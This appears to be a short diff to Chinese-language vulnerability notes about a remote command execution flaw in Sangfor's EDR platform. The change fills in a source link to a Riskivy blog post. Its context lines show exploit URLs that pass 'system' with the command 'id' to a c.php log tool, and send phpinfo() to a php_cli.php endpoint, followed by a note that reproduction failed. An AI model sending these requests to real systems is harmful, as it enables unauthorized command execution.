@@ -27,7 +27,7 @@ https://ip:prot/tool/log/c.php?strip_slashes=system&host=id&path=id&row=id&limit
 https://ip:prot/tool/php_cli.php?code=phpinfo();
 未复现成功
 ```
-[原文链接]()
+[原文链接](https://blog.riskivy.com/%e6%b7%b1%e4%bf%a1%e6%9c%8d%e7%bb%88%e7%ab%af%e6%a3%80%e6%b5%8b%e5%b9%b3%e5%8f%b0%ef%bc%88edr%ef%bc%89%e5%ad%98%e5%9c%a8%e8%bf%9c%e7%a8%8b%e5%91%bd%e4%bb%a4%e6%89%a7%e8%a1%8c%e6%bc%8f%e6%b4%9e/)
 
 
 
